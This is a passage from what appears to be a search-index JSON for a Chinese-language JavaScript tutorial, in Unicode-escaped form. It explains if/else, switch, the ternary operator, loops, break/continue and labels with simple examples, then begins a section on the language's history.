\uff0c\u5c31\u6267\u884c\u7d27\u8ddf\u5728\u540e\u9762\u7684\u8bed\u53e5\uff1b\u5982\u679c\u7ed3\u679c\u4e3a false \uff0c\u5219\u8df3\u8fc7\u7d27\u8ddf\u5728\u540e\u9762\u7684\u8bed\u53e5\u3002 1 2 if ( m === 3 ) m = m + 1 ; \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u53ea\u6709\u5728 m \u7b49\u4e8e3\u65f6\uff0c\u624d\u4f1a\u5c06\u5176\u503c\u52a0\u4e0a1\u3002 \u8fd9\u79cd\u5199\u6cd5\u8981\u6c42\u6761\u4ef6\u8868\u8fbe\u5f0f\u540e\u9762\u53ea\u80fd\u6709\u4e00\u4e2a\u8bed\u53e5\u3002\u5982\u679c\u60f3\u6267\u884c\u591a\u4e2a\u8bed\u53e5\uff0c\u5fc5\u987b\u5728 if \u7684\u6761\u4ef6\u5224\u65ad\u4e4b\u540e\uff0c\u52a0\u4e0a\u5927\u62ec\u53f7\uff0c\u8868\u793a\u4ee3\u7801\u5757\uff08\u591a\u4e2a\u8bed\u53e5\u5408\u5e76\u6210\u4e00\u4e2a\u8bed\u53e5\uff09\u3002 1 2 3 if ( m === 3 ) { m += 1 ; } \u5efa\u8bae\u603b\u662f\u5728 if \u8bed\u53e5\u4e2d\u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u56e0\u4e3a\u8fd9\u6837\u65b9\u4fbf\u63d2\u5165\u8bed\u53e5\u3002 \u6ce8\u610f\uff0c if \u540e\u9762\u7684\u8868\u8fbe\u5f0f\u4e4b\u4e2d\uff0c\u4e0d\u8981\u6df7\u6dc6\u8d4b\u503c\u8868\u8fbe\u5f0f\uff08 = \uff09\u3001\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u548c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u3002\u5c24\u5176\u662f\u8d4b\u503c\u8868\u8fbe\u5f0f\u4e0d\u5177\u6709\u6bd4\u8f83\u4f5c\u7528\u3002 1 2 3 4 5 6 var x = 1 ; var y = 2 ; if ( x = y ) { console . log ( x ); } // \"2\" \u4e0a\u9762\u4ee3\u7801\u7684\u539f\u610f\u662f\uff0c\u5f53 x \u7b49\u4e8e y \u7684\u65f6\u5019\uff0c\u624d\u6267\u884c\u76f8\u5173\u8bed\u53e5\u3002\u4f46\u662f\uff0c\u4e0d\u5c0f\u5fc3\u5c06\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u5199\u6210\u8d4b\u503c\u8868\u8fbe\u5f0f\uff0c\u7ed3\u679c\u53d8\u6210\u4e86\u5c06 y \u8d4b\u503c\u7ed9\u53d8\u91cf x \uff0c\u518d\u5224\u65ad\u53d8\u91cf x \u7684\u503c\uff08\u7b49\u4e8e2\uff09\u7684\u5e03\u5c14\u503c\uff08\u7ed3\u679c\u4e3a true \uff09\u3002 \u8fd9\u79cd\u9519\u8bef\u53ef\u4ee5\u6b63\u5e38\u751f\u6210\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u56e0\u800c\u4e0d\u4f1a\u62a5\u9519\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u6709\u4e9b\u5f00\u53d1\u8005\u4e60\u60ef\u5c06\u5e38\u91cf\u5199\u5728\u8fd0\u7b97\u7b26\u7684\u5de6\u8fb9\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u4e00\u65e6\u4e0d\u5c0f\u5fc3\u5c06\u76f8\u7b49\u8fd0\u7b97\u7b26\u5199\u6210\u8d4b\u503c\u8fd0\u7b97\u7b26\uff0c\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5e38\u91cf\u4e0d\u80fd\u88ab\u8d4b\u503c\u3002 1 2 if ( x = 2 ) { // \u4e0d\u62a5\u9519 if ( 2 = x ) { // \u62a5\u9519 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f18\u5148\u91c7\u7528\u201c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 === \uff09\uff0c\u800c\u4e0d\u662f\u201c\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 == \uff09\uff0c\u8bf7\u53c2\u8003\u300a\u8fd0\u7b97\u7b26\u300b\u7ae0\u8282\u3002","title":"if \u7ed3\u6784"},{"location":"basic/grammar/#ifelse","text":"if \u4ee3\u7801\u5757\u540e\u9762\uff0c\u8fd8\u53ef\u4ee5\u8ddf\u4e00\u4e2a else \u4ee3\u7801\u5757\uff0c\u8868\u793a\u4e0d\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u6240\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002 1 2 3 4 5 if ( m === 3 ) { // \u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u6267\u884c\u7684\u8bed\u53e5 } else { // \u4e0d\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u6267\u884c\u7684\u8bed\u53e5 } \u4e0a\u9762\u4ee3\u7801\u5224\u65ad\u53d8\u91cf m \u662f\u5426\u7b49\u4e8e3\uff0c\u5982\u679c\u7b49\u4e8e\u5c31\u6267\u884c if \u4ee3\u7801\u5757\uff0c\u5426\u5219\u6267\u884c else \u4ee3\u7801\u5757\u3002 \u5bf9\u540c\u4e00\u4e2a\u53d8\u91cf\u8fdb\u884c\u591a\u6b21\u5224\u65ad\u65f6\uff0c\u591a\u4e2a if...else \u8bed\u53e5\u53ef\u4ee5\u8fde\u5199\u5728\u4e00\u8d77\u3002 1 2 3 4 5 6 7 8 9 if ( m === 0 ) { // ... } else if ( m === 1 ) { // ... } else if ( m === 2 ) { // ... } else { // ... } else \u4ee3\u7801\u5757\u603b\u662f\u4e0e\u79bb\u81ea\u5df1\u6700\u8fd1\u7684\u90a3\u4e2a if \u8bed\u53e5\u914d\u5bf9\u3002 1 2 3 4 5 6 var m = 1 ; var n = 2 ; if ( m !== 1 ) if ( n === 2 ) console . log ( 'hello' ); else console . log ( 'world' ); \u4e0a\u9762\u4ee3\u7801\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\uff0c else \u4ee3\u7801\u5757\u4e0d\u4f1a\u5f97\u5230\u6267\u884c\uff0c\u56e0\u4e3a\u5b83\u8ddf\u7740\u7684\u662f\u6700\u8fd1\u7684\u90a3\u4e2a if \u8bed\u53e5\uff0c\u76f8\u5f53\u4e8e\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 if ( m !== 1 ) { if ( n === 2 ) { console . log ( 'hello' ); } else { console . log ( 'world' ); } } \u5982\u679c\u60f3\u8ba9 else \u4ee3\u7801\u5757\u8ddf\u968f\u6700\u4e0a\u9762\u7684\u90a3\u4e2a if \u8bed\u53e5\uff0c\u5c31\u8981\u6539\u53d8\u5927\u62ec\u53f7\u7684\u4f4d\u7f6e\u3002 1 2 3 4 5 6 7 8 if ( m !== 1 ) { if ( n === 2 ) { console . log ( 'hello' ); } } else { console . log ( 'world' ); } // world","title":"if...else \u7ed3\u6784"},{"location":"basic/grammar/#switch","text":"\u591a\u4e2a if...else \u8fde\u5728\u4e00\u8d77\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u8f6c\u4e3a\u4f7f\u7528\u66f4\u65b9\u4fbf\u7684 switch \u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 switch ( fruit ) { case \"banana\" : // ... break ; case \"apple\" : // ... break ; default : // ... } \u4e0a\u9762\u4ee3\u7801\u6839\u636e\u53d8\u91cf fruit \u7684\u503c\uff0c\u9009\u62e9\u6267\u884c\u76f8\u5e94\u7684 case \u3002\u5982\u679c\u6240\u6709 case \u90fd\u4e0d\u7b26\u5408\uff0c\u5219\u6267\u884c\u6700\u540e\u7684 default \u90e8\u5206\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u4e2a case \u4ee3\u7801\u5757\u5185\u90e8\u7684 break \u8bed\u53e5\u4e0d\u80fd\u5c11\uff0c\u5426\u5219\u4f1a\u63a5\u4e0b\u53bb\u6267\u884c\u4e0b\u4e00\u4e2a case \u4ee3\u7801\u5757\uff0c\u800c\u4e0d\u662f\u8df3\u51fa switch \u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var x = 1 ; switch ( x ) { case 1 : console . log ( 'x \u7b49\u4e8e1' ); case 2 : console . log ( 'x \u7b49\u4e8e2' ); default : console . log ( 'x \u7b49\u4e8e\u5176\u4ed6\u503c' ); } // x\u7b49\u4e8e1 // x\u7b49\u4e8e2 // x\u7b49\u4e8e\u5176\u4ed6\u503c \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c case \u4ee3\u7801\u5757\u4e4b\u4e2d\u6ca1\u6709 break \u8bed\u53e5\uff0c\u5bfc\u81f4\u4e0d\u4f1a\u8df3\u51fa switch \u7ed3\u6784\uff0c\u800c\u4f1a\u4e00\u76f4\u6267\u884c\u4e0b\u53bb\u3002\u6b63\u786e\u7684\u5199\u6cd5\u662f\u50cf\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 9 10 switch ( x ) { case 1 : console . log ( 'x \u7b49\u4e8e1' ); break ; case 2 : console . log ( 'x \u7b49\u4e8e2' ); break ; default : console . log ( 'x \u7b49\u4e8e\u5176\u4ed6\u503c' ); } switch \u8bed\u53e5\u90e8\u5206\u548c case \u8bed\u53e5\u90e8\u5206\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u3002 1 2 3 4 5 6 7 switch ( 1 + 3 ) { case 2 + 2 : f (); break ; default : neverHappens (); } \u4e0a\u9762\u4ee3\u7801\u7684 default \u90e8\u5206\uff0c\u662f\u6c38\u8fdc\u4e0d\u4f1a\u6267\u884c\u5230\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c switch \u8bed\u53e5\u540e\u9762\u7684\u8868\u8fbe\u5f0f\uff0c\u4e0e case \u8bed\u53e5\u540e\u9762\u7684\u8868\u793a\u5f0f\u6bd4\u8f83\u8fd0\u884c\u7ed3\u679c\u65f6\uff0c\u91c7\u7528\u7684\u662f\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\uff0c\u800c\u4e0d\u662f\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\uff0c\u8fd9\u610f\u5473\u7740\u6bd4\u8f83\u65f6\u4e0d\u4f1a\u53d1\u751f\u7c7b\u578b\u8f6c\u6362\u3002 1 2 3 4 5 6 7 8 9 10 var x = 1 ; switch ( x ) { case true : console . log ( 'x \u53d1\u751f\u7c7b\u578b\u8f6c\u6362' ); break ; default : console . log ( 'x \u6ca1\u6709\u53d1\u751f\u7c7b\u578b\u8f6c\u6362' ); } // x \u6ca1\u6709\u53d1\u751f\u7c7b\u578b\u8f6c\u6362 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u53d8\u91cf x \u6ca1\u6709\u53d1\u751f\u7c7b\u578b\u8f6c\u6362\uff0c\u6240\u4ee5\u4e0d\u4f1a\u6267\u884c case true \u7684\u60c5\u51b5\u3002\u8fd9\u8868\u660e\uff0c switch \u8bed\u53e5\u5185\u90e8\u91c7\u7528\u7684\u662f\u201c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff0c\u8be6\u7ec6\u89e3\u91ca\u8bf7\u53c2\u8003\u300a\u8fd0\u7b97\u7b26\u300b\u4e00\u8282\u3002","title":"switch \u7ed3\u6784"},{"location":"basic/grammar/#_9","text":"JavaScript \u8fd8\u6709\u4e00\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\uff08\u5373\u8be5\u8fd0\u7b97\u7b26\u9700\u8981\u4e09\u4e2a\u8fd0\u7b97\u5b50\uff09 ?: \uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u903b\u8f91\u5224\u65ad\u3002 1 ( \u6761\u4ef6 ) ? \u8868\u8fbe\u5f0f1 : \u8868\u8fbe\u5f0f2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u201c\u6761\u4ef6\u201d\u4e3a true \uff0c\u5219\u8fd4\u56de\u201c\u8868\u8fbe\u5f0f1\u201d\u7684\u503c\uff0c\u5426\u5219\u8fd4\u56de\u201c\u8868\u8fbe\u5f0f2\u201d\u7684\u503c\u3002 1 var even = ( n % 2 === 0 ) ? true : false ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c n \u53ef\u4ee5\u88ab2\u6574\u9664\uff0c\u5219 even \u7b49\u4e8e true \uff0c\u5426\u5219\u7b49\u4e8e false \u3002\u5b83\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5f62\u5f0f\u3002 1 2 3 4 5 6 var even ; if ( n % 2 === 0 ) { even = true ; } else { even = false ; } \u8fd9\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\u53ef\u4ee5\u88ab\u89c6\u4e3a if...else... \u7684\u7b80\u5199\u5f62\u5f0f\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u591a\u79cd\u573a\u5408\u3002 1 2 3 4 5 6 7 var myVar ; console . log ( myVar ? 'myVar has a value' : 'myVar does not have a value' ) // myVar does not have a value \u4e0a\u9762\u4ee3\u7801\u5229\u7528\u4e09\u5143\u8fd0\u7b97\u7b26\uff0c\u8f93\u51fa\u76f8\u5e94\u7684\u63d0\u793a\u3002 1 var msg = '\u6570\u5b57' + n + '\u662f' + ( n % 2 === 0 ? '\u5076\u6570' : '\u5947\u6570' ); \u4e0a\u9762\u4ee3\u7801\u5229\u7528\u4e09\u5143\u8fd0\u7b97\u7b26\uff0c\u5728\u5b57\u7b26\u4e32\u4e4b\u4e2d\u63d2\u5165\u4e0d\u540c\u7684\u503c\u3002","title":"\u4e09\u5143\u8fd0\u7b97\u7b26 ?:"},{"location":"basic/grammar/#_10","text":"\u5faa\u73af\u8bed\u53e5\u7528\u4e8e\u91cd\u590d\u6267\u884c\u67d0\u4e2a\u64cd\u4f5c\uff0c\u5b83\u6709\u591a\u79cd\u5f62\u5f0f\u3002","title":"\u5faa\u73af\u8bed\u53e5"},{"location":"basic/grammar/#while","text":"While \u8bed\u53e5\u5305\u62ec\u4e00\u4e2a\u5faa\u73af\u6761\u4ef6\u548c\u4e00\u6bb5\u4ee3\u7801\u5757\uff0c\u53ea\u8981\u6761\u4ef6\u4e3a\u771f\uff0c\u5c31\u4e0d\u65ad\u5faa\u73af\u6267\u884c\u4ee3\u7801\u5757\u3002 1 2 3 4 5 while ( \u6761\u4ef6 ) \u8bed\u53e5 ; // \u6216\u8005 while ( \u6761\u4ef6 ) \u8bed\u53e5 ; while \u8bed\u53e5\u7684\u5faa\u73af\u6761\u4ef6\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5fc5\u987b\u653e\u5728\u5706\u62ec\u53f7\u4e2d\u3002\u4ee3\u7801\u5757\u90e8\u5206\uff0c\u5982\u679c\u53ea\u6709\u4e00\u6761\u8bed\u53e5\uff0c\u53ef\u4ee5\u7701\u7565\u5927\u62ec\u53f7\uff0c\u5426\u5219\u5c31\u5fc5\u987b\u52a0\u4e0a\u5927\u62ec\u53f7\u3002 1 2 3 while ( \u6761\u4ef6 ) { \u8bed\u53e5 ; } \u4e0b\u9762\u662f while \u8bed\u53e5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 var i = 0 ; while ( i < 100 ) { console . log ( 'i \u5f53\u524d\u4e3a\uff1a' + i ); i = i + 1 ; } \u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u5faa\u73af100\u6b21\uff0c\u76f4\u5230 i \u7b49\u4e8e100\u4e3a\u6b62\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4e00\u4e2a\u65e0\u9650\u5faa\u73af\uff0c\u56e0\u4e3a\u5faa\u73af\u6761\u4ef6\u603b\u662f\u4e3a\u771f\u3002 1 2 3 while ( true ) { console . log ( 'Hello, world' ); }","title":"while \u5faa\u73af"},{"location":"basic/grammar/#for","text":"for \u8bed\u53e5\u662f\u5faa\u73af\u547d\u4ee4\u7684\u53e6\u4e00\u79cd\u5f62\u5f0f\uff0c\u53ef\u4ee5\u6307\u5b9a\u5faa\u73af\u7684\u8d77\u70b9\u3001\u7ec8\u70b9\u548c\u7ec8\u6b62\u6761\u4ef6\u3002\u5b83\u7684\u683c\u5f0f\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 for ( \u521d\u59cb\u5316\u8868\u8fbe\u5f0f ; \u6761\u4ef6 ; \u9012\u589e\u8868\u8fbe\u5f0f ) \u8bed\u53e5 // \u6216\u8005 for ( \u521d\u59cb\u5316\u8868\u8fbe\u5f0f ; \u6761\u4ef6 ; \u9012\u589e\u8868\u8fbe\u5f0f ) { \u8bed\u53e5 } for \u8bed\u53e5\u540e\u9762\u7684\u62ec\u53f7\u91cc\u9762\uff0c\u6709\u4e09\u4e2a\u8868\u8fbe\u5f0f\u3002 \u521d\u59cb\u5316\u8868\u8fbe\u5f0f\uff08initialize\uff09\uff1a\u786e\u5b9a\u5faa\u73af\u53d8\u91cf\u7684\u521d\u59cb\u503c\uff0c\u53ea\u5728\u5faa\u73af\u5f00\u59cb\u65f6\u6267\u884c\u4e00\u6b21\u3002 \u6761\u4ef6\u8868\u8fbe\u5f0f\uff08test\uff09\uff1a\u6bcf\u8f6e\u5faa\u73af\u5f00\u59cb\u65f6\uff0c\u90fd\u8981\u6267\u884c\u8fd9\u4e2a\u6761\u4ef6\u8868\u8fbe\u5f0f\uff0c\u53ea\u6709\u503c\u4e3a\u771f\uff0c\u624d\u7ee7\u7eed\u8fdb\u884c\u5faa\u73af\u3002 \u9012\u589e\u8868\u8fbe\u5f0f\uff08increment\uff09\uff1a\u6bcf\u8f6e\u5faa\u73af\u7684\u6700\u540e\u4e00\u4e2a\u64cd\u4f5c\uff0c\u901a\u5e38\u7528\u6765\u9012\u589e\u5faa\u73af\u53d8\u91cf\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var x = 3 ; for ( var i = 0 ; i < x ; i ++ ) { console . log ( i ); } // 0 // 1 // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u521d\u59cb\u5316\u8868\u8fbe\u5f0f\u662f var i = 0 \uff0c\u5373\u521d\u59cb\u5316\u4e00\u4e2a\u53d8\u91cf i \uff1b\u6d4b\u8bd5\u8868\u8fbe\u5f0f\u662f i < x \uff0c\u5373\u53ea\u8981 i \u5c0f\u4e8e x \uff0c\u5c31\u4f1a\u6267\u884c\u5faa\u73af\uff1b\u9012\u589e\u8868\u8fbe\u5f0f\u662f i++ \uff0c\u5373\u6bcf\u6b21\u5faa\u73af\u7ed3\u675f\u540e\uff0c i \u589e\u59271\u3002 \u6240\u6709 for \u5faa\u73af\uff0c\u90fd\u53ef\u4ee5\u6539\u5199\u6210 while \u5faa\u73af\u3002\u4e0a\u9762\u7684\u4f8b\u5b50\u6539\u4e3a while \u5faa\u73af\uff0c\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 var x = 3 ; var i = 0 ; while ( i < x ) { console . log ( i ); i ++ ; } for \u8bed\u53e5\u7684\u4e09\u4e2a\u90e8\u5206\uff08initialize\u3001test\u3001increment\uff09\uff0c\u53ef\u4ee5\u7701\u7565\u4efb\u4f55\u4e00\u4e2a\uff0c\u4e5f\u53ef\u4ee5\u5168\u90e8\u7701\u7565\u3002 1 2 3 for ( ; ; ){ console . log ( 'Hello World' ); } \u4e0a\u9762\u4ee3\u7801\u7701\u7565\u4e86 for \u8bed\u53e5\u8868\u8fbe\u5f0f\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7ed3\u679c\u5c31\u5bfc\u81f4\u4e86\u4e00\u4e2a\u65e0\u9650\u5faa\u73af\u3002","title":"for \u5faa\u73af"},{"location":"basic/grammar/#dowhile","text":"do...while \u5faa\u73af\u4e0e while \u5faa\u73af\u7c7b\u4f3c\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u5148\u8fd0\u884c\u4e00\u6b21\u5faa\u73af\u4f53\uff0c\u7136\u540e\u5224\u65ad\u5faa\u73af\u6761\u4ef6\u3002 1 2 3 4 5 6 7 8 do \u8bed\u53e5 while ( \u6761\u4ef6 ); // \u6216\u8005 do { \u8bed\u53e5 } while ( \u6761\u4ef6 ); \u4e0d\u7ba1\u6761\u4ef6\u662f\u5426\u4e3a\u771f\uff0c do...while \u5faa\u73af\u81f3\u5c11\u8fd0\u884c\u4e00\u6b21\uff0c\u8fd9\u662f\u8fd9\u79cd\u7ed3\u6784\u6700\u5927\u7684\u7279\u70b9\u3002\u53e6\u5916\uff0c while \u8bed\u53e5\u540e\u9762\u7684\u5206\u53f7\u6ce8\u610f\u4e0d\u8981\u7701\u7565\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var x = 3 ; var i = 0 ; do { console . log ( i ); i ++ ; } while ( i < x );","title":"do...while \u5faa\u73af"},{"location":"basic/grammar/#break-continue","text":"break \u8bed\u53e5\u548c continue \u8bed\u53e5\u90fd\u5177\u6709\u8df3\u8f6c\u4f5c\u7528\uff0c\u53ef\u4ee5\u8ba9\u4ee3\u7801\u4e0d\u6309\u65e2\u6709\u7684\u987a\u5e8f\u6267\u884c\u3002 break \u8bed\u53e5\u7528\u4e8e\u8df3\u51fa\u4ee3\u7801\u5757\u6216\u5faa\u73af\u3002 1 2 3 4 5 6 7 var i = 0 ; while ( i < 100 ) { console . log ( 'i \u5f53\u524d\u4e3a\uff1a' + i ); i ++ ; if ( i === 10 ) break ; } \u4e0a\u9762\u4ee3\u7801\u53ea\u4f1a\u6267\u884c10\u6b21\u5faa\u73af\uff0c\u4e00\u65e6 i \u7b49\u4e8e10\uff0c\u5c31\u4f1a\u8df3\u51fa\u5faa\u73af\u3002 for \u5faa\u73af\u4e5f\u53ef\u4ee5\u4f7f\u7528 break \u8bed\u53e5\u8df3\u51fa\u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 for ( var i = 0 ; i < 5 ; i ++ ) { console . log ( i ); if ( i === 3 ) break ; } // 0 // 1 // 2 // 3 \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u5230 i \u7b49\u4e8e3\uff0c\u5c31\u4f1a\u8df3\u51fa\u5faa\u73af\u3002 continue \u8bed\u53e5\u7528\u4e8e\u7acb\u5373\u7ec8\u6b62\u672c\u8f6e\u5faa\u73af\uff0c\u8fd4\u56de\u5faa\u73af\u7ed3\u6784\u7684\u5934\u90e8\uff0c\u5f00\u59cb\u4e0b\u4e00\u8f6e\u5faa\u73af\u3002 1 2 3 4 5 6 7 var i = 0 ; while ( i < 100 ){ i ++ ; if ( i % 2 === 0 ) continue ; console . log ( 'i \u5f53\u524d\u4e3a\uff1a' + i ); } \u4e0a\u9762\u4ee3\u7801\u53ea\u6709\u5728 i \u4e3a\u5947\u6570\u65f6\uff0c\u624d\u4f1a\u8f93\u51fa i \u7684\u503c\u3002\u5982\u679c i \u4e3a\u5076\u6570\uff0c\u5219\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5faa\u73af\u3002 \u5982\u679c\u5b58\u5728\u591a\u91cd\u5faa\u73af\uff0c\u4e0d\u5e26\u53c2\u6570\u7684 break \u8bed\u53e5\u548c continue \u8bed\u53e5\u90fd\u53ea\u9488\u5bf9\u6700\u5185\u5c42\u5faa\u73af\u3002","title":"break \u8bed\u53e5\u548c continue \u8bed\u53e5"},{"location":"basic/grammar/#label","text":"JavaScript \u8bed\u8a00\u5141\u8bb8\uff0c\u8bed\u53e5\u7684\u524d\u9762\u6709\u6807\u7b7e\uff08label\uff09\uff0c\u76f8\u5f53\u4e8e\u5b9a\u4f4d\u7b26\uff0c\u7528\u4e8e\u8df3\u8f6c\u5230\u7a0b\u5e8f\u7684\u4efb\u610f\u4f4d\u7f6e\uff0c\u6807\u7b7e\u7684\u683c\u5f0f\u5982\u4e0b\u3002 1 2 label : \u8bed\u53e5 \u6807\u7b7e\u53ef\u4ee5\u662f\u4efb\u610f\u7684\u6807\u8bc6\u7b26\uff0c\u4f46\u4e0d\u80fd\u662f\u4fdd\u7559\u5b57\uff0c\u8bed\u53e5\u90e8\u5206\u53ef\u4ee5\u662f\u4efb\u610f\u8bed\u53e5\u3002 \u6807\u7b7e\u901a\u5e38\u4e0e break \u8bed\u53e5\u548c continue \u8bed\u53e5\u914d\u5408\u4f7f\u7528\uff0c\u8df3\u51fa\u7279\u5b9a\u7684\u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 10 11 top : for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( i === 1 && j === 1 ) break top ; console . log ( 'i=' + i + ', j=' + j ); } } // i=0, j=0 // i=0, j=1 // i=0, j=2 // i=1, j=0 \u4e0a\u9762\u4ee3\u7801\u4e3a\u4e00\u4e2a\u53cc\u91cd\u5faa\u73af\u533a\u5757\uff0c break \u547d\u4ee4\u540e\u9762\u52a0\u4e0a\u4e86 top \u6807\u7b7e\uff08\u6ce8\u610f\uff0c top \u4e0d\u7528\u52a0\u5f15\u53f7\uff09\uff0c\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u76f4\u63a5\u8df3\u51fa\u53cc\u5c42\u5faa\u73af\u3002\u5982\u679c break \u8bed\u53e5\u540e\u9762\u4e0d\u4f7f\u7528\u6807\u7b7e\uff0c\u5219\u53ea\u80fd\u8df3\u51fa\u5185\u5c42\u5faa\u73af\uff0c\u8fdb\u5165\u4e0b\u4e00\u6b21\u7684\u5916\u5c42\u5faa\u73af\u3002 \u6807\u7b7e\u4e5f\u53ef\u4ee5\u7528\u4e8e\u8df3\u51fa\u4ee3\u7801\u5757\u3002 1 2 3 4 5 6 7 8 foo : { console . log ( 1 ); break foo ; console . log ( '\u672c\u884c\u4e0d\u4f1a\u8f93\u51fa' ); } console . log ( 2 ); // 1 // 2 \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u5230 break foo \uff0c\u5c31\u4f1a\u8df3\u51fa\u533a\u5757\u3002 continue \u8bed\u53e5\u4e5f\u53ef\u4ee5\u4e0e\u6807\u7b7e\u914d\u5408\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 top : for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( i === 1 && j === 1 ) continue top ; console . log ( 'i=' + i + ', j=' + j ); } } // i=0, j=0 // i=0, j=1 // i=0, j=2 // i=1, j=0 // i=2, j=0 // i=2, j=1 // i=2, j=2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c continue \u547d\u4ee4\u540e\u9762\u6709\u4e00\u4e2a\u6807\u7b7e\u540d\uff0c\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u4f1a\u8df3\u8fc7\u5f53\u524d\u5faa\u73af\uff0c\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5916\u5c42\u5faa\u73af\u3002\u5982\u679c continue \u8bed\u53e5\u540e\u9762\u4e0d\u4f7f\u7528\u6807\u7b7e\uff0c\u5219\u53ea\u80fd\u8fdb\u5165\u4e0b\u4e00\u8f6e\u7684\u5185\u5c42\u5faa\u73af\u3002","title":"\u6807\u7b7e\uff08label\uff09"},{"location":"basic/grammar/#_11","text":"Axel Rauschmayer, A quick overview of JavaScript","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"basic/history/","text":"JavaScript \u8bed\u8a00\u7684\u5386\u53f2 \u00b6 \u8bde\u751f \u00b6 JavaScript \u56e0\u4e3a\u4e92\u8054\u7f51\u800c\u751f\uff0c\u7d27\u8ddf\u7740\u6d4f\u89c8\u5668\u7684\u51fa\u73b0\u800c\u95ee\u4e16\u3002\u56de\u987e\u5b83\u7684\u5386\u53f2\uff0c\u5c31\u8981\u4ece\u6d4f\u89c8\u5668\u7684\u5386\u53f2\u8bb2\u8d77\u3002 1990\u5e74\u5e95\uff0c\u6b27\u6d32\u6838\u80fd\u7814\u7a76\u7ec4\u7ec7\uff08CERN\uff09\u79d1\u5b66\u5bb6 Tim Berners-Lee\uff0c\u5728\u5168\u4e16\u754c\u6700\u5927\u7684\u7535\u8111\u7f51\u7edc\u2014\u2014\u4e92\u8054\u7f51\u7684\u57fa\u7840\u4e0a\uff0c\u53d1\u660e\u4e86\u4e07\u7ef4\u7f51\uff08World Wide Web\uff09\uff0c\u4ece\u6b64\u53ef\u4ee5\u5728\u7f51\u4e0a\u6d4f\u89c8\u7f51\u9875\u6587\u4ef6\u3002\u6700\u65e9\u7684\u7f51\u9875\u53ea\u80fd\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ec8\u7aef\u91cc\u6d4f\u89c8\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u80fd\u4f7f\u7528\u547d\u4ee4\u884c\u64cd\u4f5c\uff0c\u7f51\u9875\u90fd\u662f\u5728\u5b57\u7b26\u7a97\u53e3\u4e2d\u663e\u793a\uff0c\u8fd9\u5f53\u7136\u975e\u5e38\u4e0d\u65b9\u4fbf\u3002 